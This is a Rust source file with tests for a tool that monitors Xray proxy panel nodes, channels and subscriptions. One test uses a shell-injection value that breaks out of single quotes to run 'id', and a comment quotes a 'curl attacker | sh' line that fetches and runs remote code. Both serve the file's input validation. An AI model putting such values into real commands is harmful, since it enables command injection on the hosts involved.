use serde::{Deserialize, Serialize};
use std::collections::HashMap;

/// Severity of one check. Ordering matters: a run's severity is the maximum.
///
/// One textual encoding, and only one: the state file goes through
/// `Display`/`FromStr` too, so a derived encoding would give the same value a
/// second spelling that nothing else in the tool understands.
#[derive(
    Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Serialize, Deserialize,
)]
#[serde(into = "String", try_from = "String")]
pub enum Severity {
    Ok,
    Warn,
    Fail,
}

impl From<Severity> for String {
    fn from(severity: Severity) -> Self {
        severity.to_string()
    }
}

impl TryFrom<String> for Severity {
    type Error = ParseSeverityError;

    fn try_from(s: String) -> Result<Self, Self::Error> {
        s.parse()
    }
}

impl Severity {
    pub fn is_ok(self) -> bool {
        self == Self::Ok
    }
}

/// These three strings are part of the tool's output contract, not a debug
/// rendering: the report, the alerts and the state file all read them.
impl std::fmt::Display for Severity {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        // `pad`, not `write_str`: the report table formats severities with a
        // width (`{:<6}`), and only `pad` honours it.
        f.pad(match self {
            Self::Ok => "OK",
            Self::Warn => "WARN",
            Self::Fail => "FAIL",
        })
    }
}

/// Anything that is not one of the three labels.
#[derive(Debug, Clone, PartialEq, Eq, thiserror::Error)]
#[error("unknown severity: {0}")]
pub struct ParseSeverityError(pub String);

impl std::str::FromStr for Severity {
    type Err = ParseSeverityError;

    fn from_str(s: &str) -> Result<Self, Self::Err> {
        match s {
            "OK" => Ok(Self::Ok),
            "WARN" => Ok(Self::Warn),
            "FAIL" => Ok(Self::Fail),
            other => Err(ParseSeverityError(other.to_string())),
        }
    }
}

/// The one place that decides what counts as an address.
///
/// Both sides of the exit comparison go through here, so neither can drift into
/// a different notion of "same address". An HTML error page, a curl error line
/// or a captive-portal form is not an address and must never be reported as
/// one.
pub fn parse_ip(text: &str) -> Option<std::net::IpAddr> {
    text.trim().parse().ok()
}

/// The endpoint that echoes a caller's address back.
///
/// It reaches a node single-quoted inside `curl -fsS --max-time 8 '<url>'`, and
/// a POSIX shell takes everything inside single quotes literally except the
/// quote itself — so a URL carrying one could end the quoting and continue as a
/// command. This is the only way to build one, so nothing downstream can
/// receive a URL that was never refused.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct EchoUrl(String);

impl EchoUrl {
    pub fn as_str(&self) -> &str {
        &self.0
    }
}

/// A URL that cannot be put into a command line safely.
#[derive(Debug, Clone, PartialEq, Eq, thiserror::Error)]
#[error("an echo URL may not contain a quote: {0}")]
pub struct QuotedEchoUrl(pub String);

impl std::str::FromStr for EchoUrl {
    type Err = QuotedEchoUrl;

    fn from_str(s: &str) -> Result<Self, Self::Err> {
        if s.contains('\'') {
            return Err(QuotedEchoUrl(s.to_string()));
        }
        Ok(Self(s.to_string()))
    }
}

impl std::fmt::Display for EchoUrl {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.write_str(&self.0)
    }
}

/// One check outcome. `key` is stable across runs and is what the diff
/// compares.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct CheckResult {
    pub key: String,
    pub title: String,
    pub severity: Severity,
    pub detail: String,
}

impl CheckResult {
    pub fn new(
        key: impl Into<String>,
        title: impl Into<String>,
        severity: Severity,
        detail: impl Into<String>,
    ) -> Self {
        Self {
            key: key.into(),
            title: title.into(),
            severity,
            detail: detail.into(),
        }
    }
}

/// A node as the panel describes it.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Node {
    pub name: String,
    /// Address the panel uses to reach the node; also the SSH target.
    pub address: String,
    pub profile_uuid: Option<String>,
    /// Tags of the inbounds currently active on this node.
    pub inbound_tags: Vec<String>,
    /// Ports of those inbounds; drives the "is it listening" check.
    pub inbound_ports: Vec<u16>,
    pub is_disabled: bool,
    pub is_connected: bool,
    /// Mid-(re)connect. `is_connected` is false for that whole window, so
    /// without this bit a reconnecting node looks exactly like a dead one.
    pub is_connecting: bool,
    pub last_status_message: Option<String>,
    pub xray_version: Option<String>,
}

impl Node {
    /// The panel's verdict on this node, decided in one place.
    ///
    /// The order of the arms is the whole content of this function. `Disabled`
    /// wins over everything: switching a node off explains whatever else it
    /// reports, and the panel stops its xray anyway. `Connecting` wins over
    /// `Disconnected` because the panel sets it without clearing
    /// `last_status_message`, so reporting such a node as down would name a
    /// cause that belongs to an earlier attempt.
    pub fn panel_state(&self) -> PanelState<'_> {
        if self.is_disabled {
            PanelState::Disabled
        } else if self.is_connecting {
            PanelState::Connecting
        } else if !self.is_connected {
            PanelState::Disconnected {
                reason: self.last_status_message.as_deref(),
            }
        } else {
            PanelState::Connected
        }
    }

    /// Not switched off by an administrator.
    ///
    /// Narrower than the panel's own notion of a usable node, which also wants
    /// it connected: a node that dropped its connection is exactly the one
    /// whose host is still worth looking at over SSH.
    pub const fn is_enabled(&self) -> bool {
        !self.is_disabled
    }
}

/// What the panel says about a node, as one value.
///
/// The three flags are mirrored exactly as they arrived: the panel's writes are
/// not transactional with its own start job, which ends by storing whether the
/// node started without re-reading whether it has since been disabled. Any
/// combination of bits is therefore observable, so the collapse happens here,
/// once, with a fixed precedence.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum PanelState<'a> {
    /// Switched off by an administrator.
    Disabled,
    /// Connecting, or reconnecting after a drop.
    Connecting,
    /// Down, with whatever reason the panel recorded for the last attempt.
    Disconnected {
        reason: Option<&'a str>,
    },
    Connected,
}

/// A client-facing channel, exactly as the monitoring user receives it.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Channel {
    /// Host remark: the human-facing channel name, and part of the check key.
    pub remark: String,
    pub inbound_tag: String,
    /// `None` is a legitimate panel state — a legacy host, or one whose profile
    /// was deleted — not corrupted data. Such a channel has no entry node to
    /// resolve and must fail loudly rather than pass as healthy.
    pub profile_uuid: Option<String>,
    pub address: String,
    pub port: u16,
    /// Ready-made Xray outbound from the subscription, never assembled by us.
    /// `Value::Null` means it served no config for this channel.
    pub outbound: serde_json::Value,
}

impl Channel {
    /// Stable key of this channel's check. Built by `CheckKey`, where every key
    /// of every check comes from and where the reasoning lives.
    pub fn check_key(&self) -> String {
        crate::keys::CheckKey::Channel {
            remark: &self.remark,
            address: &self.address,
            port: self.port,
        }
        .to_string()
    }
}

/// An Xray config profile: the full JSON, as stored in the panel.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Profile {
    pub uuid: String,
    pub name: String,
    pub config: serde_json::Value,
}

/// Everything one run needs from the panel.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Snapshot {
    pub nodes: Vec<Node>,
    pub profiles: HashMap<String, Profile>,
    pub channels: Vec<Channel>,
    /// What the rendered subscription served, duplicates included. A list and
    /// not a count, so `subscription:coverage` can name what is missing: one
    /// channel dropped and another duplicated leaves the counts equal.
    pub served_remarks: Vec<String>,
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn severity_orders_ok_below_warn_below_fail() {
        assert!(Severity::Ok < Severity::Warn);
        assert!(Severity::Warn < Severity::Fail);
    }

    #[test]
    fn only_a_bare_address_parses_as_an_ip() {
        assert_eq!(
            parse_ip(" 203.0.113.7\n"),
            Some("203.0.113.7".parse().unwrap())
        );
        assert_eq!(
            parse_ip("2001:db8::1"),
            Some("2001:db8::1".parse().unwrap())
        );
        assert_eq!(parse_ip(""), None);
        assert_eq!(
            parse_ip("<html><title>502 Bad Gateway</title></html>"),
            None
        );
        assert_eq!(parse_ip("203.0.113.7 (cached)"), None);
        assert_eq!(parse_ip("curl: (28) Operation timed out"), None);
    }

    #[test]
    fn severity_renders_the_three_report_labels() {
        assert_eq!(Severity::Ok.to_string(), "OK");
        assert_eq!(Severity::Warn.to_string(), "WARN");
        assert_eq!(Severity::Fail.to_string(), "FAIL");
    }

    #[test]
    fn severity_honours_a_format_width() {
        // The report lays severities out in a fixed column; losing the padding
        // would reflow every row of it.
        assert_eq!(format!("{:<6}|", Severity::Ok), "OK    |");
        assert_eq!(format!("{:<6}|", Severity::Fail), "FAIL  |");
    }

    #[test]
    fn severity_parses_back_from_its_own_label() {
        for s in [Severity::Ok, Severity::Warn, Severity::Fail] {
            assert_eq!(s.to_string().parse::<Severity>(), Ok(s));
        }
    }

    #[test]
    fn an_unknown_severity_label_is_an_error_naming_the_input() {
        let err = "SOMETHING".parse::<Severity>().unwrap_err();
        assert_eq!(err, ParseSeverityError("SOMETHING".to_string()));
        assert!(err.to_string().contains("SOMETHING"));
        // Case and stray whitespace are not accepted: the labels are exact.
        assert!("fail".parse::<Severity>().is_err());
        assert!(" FAIL".parse::<Severity>().is_err());
        assert!("".parse::<Severity>().is_err());
    }

    #[test]
    fn channels_sharing_a_remark_still_get_different_keys() {
        let channel = |address: &str, port: u16| Channel {
            remark: "the same remark".into(),
            inbound_tag: "in-a".into(),
            profile_uuid: Some("p".into()),
            address: address.into(),
            port,
            outbound: serde_json::Value::Null,
        };
        let a = channel("alpha.example.com", 443);
        let b = channel("beta.example.com", 443);
        let c = channel("alpha.example.com", 8443);
        assert_ne!(a.check_key(), b.check_key());
        assert_ne!(a.check_key(), c.check_key());
        assert!(a.check_key().starts_with("channel:"));
        // Stable across calls: the diff between two runs depends on it.
        assert_eq!(
            a.check_key(),
            channel("alpha.example.com", 443).check_key()
        );
    }

    #[test]
    fn an_echo_url_carrying_a_quote_is_refused() {
        use std::str::FromStr;

        // The shape that made this a type: `'; curl attacker | sh; echo '`
        // closes the quoting it is pasted into and runs as its own command.
        let hostile = "https://example.com/'; id; echo '";
        assert_eq!(
            EchoUrl::from_str(hostile),
            Err(QuotedEchoUrl(hostile.to_string()))
        );
        assert!(EchoUrl::from_str(hostile)
            .unwrap_err()
            .to_string()
            .contains("quote"));

        let ordinary = "https://api.ipify.org";
        assert_eq!(EchoUrl::from_str(ordinary).unwrap().as_str(), ordinary);
        // Everything else is literal inside single quotes, and stays allowed.
        assert!(EchoUrl::from_str("https://e.example.com/ip?fmt=$x&y=`z`;#|")
            .is_ok());
    }

    #[test]
    fn check_result_carries_key_title_and_detail() {
        let r = CheckResult::new(
            "channel:alpha",
            "alpha",
            Severity::Fail,
            "no exit",
        );
        assert_eq!(r.key, "channel:alpha");
        assert_eq!(r.title, "alpha");
        assert_eq!(r.severity, Severity::Fail);
        assert_eq!(r.detail, "no exit");
    }

    fn node(
        disabled: bool,
        connecting: bool,
        connected: bool,
        message: Option<&str>,
    ) -> Node {
        Node {
            name: "alpha".into(),
            address: "192.0.2.1".into(),
            profile_uuid: None,
            inbound_tags: vec![],
            inbound_ports: vec![],
            is_disabled: disabled,
            is_connected: connected,
            is_connecting: connecting,
            last_status_message: message.map(String::from),
            xray_version: None,
        }
    }

    #[test]
    fn a_disabled_node_stays_disabled_whatever_the_other_bits_say() {
        // A node disabled while its start job was in flight comes back disabled
        // with `isConnected` still set.
        assert_eq!(
            node(true, false, true, None).panel_state(),
            PanelState::Disabled
        );
        assert_eq!(
            node(true, true, false, None).panel_state(),
            PanelState::Disabled
        );
    }

    #[test]
    fn a_reconnecting_node_is_neither_connected_nor_a_failure() {
        // The reason left in `lastStatusMessage` belongs to an earlier attempt,
        // so this state carries none.
        assert_eq!(
            node(false, true, false, Some("boom")).panel_state(),
            PanelState::Connecting
        );
    }

    #[test]
    fn a_disconnected_node_carries_the_panels_own_reason_only_when_there_is_one(
    ) {
        assert_eq!(
            node(false, false, false, Some("boom")).panel_state(),
            PanelState::Disconnected {
                reason: Some("boom")
            }
        );
        assert_eq!(
            node(false, false, false, None).panel_state(),
            PanelState::Disconnected { reason: None }
        );
        // A connected node keeps the last failure's message; it is not current.
        assert_eq!(
            node(false, false, true, Some("boom")).panel_state(),
            PanelState::Connected
        );
    }

    #[test]
    fn only_an_administrator_switching_a_node_off_makes_it_not_enabled() {
        assert!(node(false, false, true, None).is_enabled());
        assert!(node(false, false, false, None).is_enabled());
        assert!(node(false, true, false, None).is_enabled());
        assert!(!node(true, false, false, None).is_enabled());
    }
}
